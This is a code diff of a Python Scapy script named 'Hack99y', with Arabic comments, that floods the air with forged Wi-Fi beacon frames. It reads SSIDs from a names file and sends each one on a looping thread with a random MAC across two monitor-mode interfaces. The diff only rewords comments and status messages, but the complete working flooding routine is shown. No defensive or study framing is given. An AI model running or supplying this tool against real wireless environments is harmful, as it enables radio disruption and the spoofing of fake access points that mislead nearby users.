@@ -19,13 +19,13 @@ interfaces = ["wlan0mon", "wlan1mon"]
 names_file = "names.txt"
 
 def send_beacon(ssid, mac, iface):
-    # بناء حزمة Beacon (SSID وهمي)
+    # بناء حزمة Beacon
     dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
     beacon = Dot11Beacon(cap="ESS+privacy")
     essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
     frame = RadioTap()/dot11/beacon/essid
     
-    # الإرسال المستمر
+    # إرسال مستمر بتردد 0.1 ثانية
     sendp(frame, iface=iface, inter=0.1, loop=1, verbose=False)
 
 def start_hack99y():
@@ -39,13 +39,14 @@ def start_hack99y():
     with open(names_file, "r") as f:
         ssids = [line.strip() for line in f.readlines()]
 
-    print(f"[*] Starting Hack99y on: {', '.join(interfaces)}")
-    print(f"[*] Total Networks: {len(ssids)}")
+    print(f"[*] Interfaces: {', '.join(interfaces)}")
+    print(f"[*] Total Networks to Create: {len(ssids)}")
     print("-" * 50)
 
     threads = []
     for i, ssid in enumerate(ssids):
-        iface = interfaces[i % 2] # التبديل بين wlan0 و wlan1
+        # توزيع آلي بين wlan0mon و wlan1mon
+        iface = interfaces[i % 2] 
         mac = RandMAC()
         
         t = threading.Thread(target=send_beacon, args=(ssid, mac, iface))
@@ -53,13 +54,13 @@ def start_hack99y():
         t.start()
         threads.append(t)
     
-    print(f"[!] Hack99y is now flooding the air... Press Ctrl+C to stop.")
+    print(f"[!] Hack99y is running... Press Ctrl+C to stop.")
     
     try:
         for t in threads:
             t.join()
     except KeyboardInterrupt:
-        print("\n[!] Hack99y stopping... cleaning up.")
+        print("\n[!] Stopping Hack99y... Cleaning up.")
         sys.exit()
 
 if __name__ == "__main__":
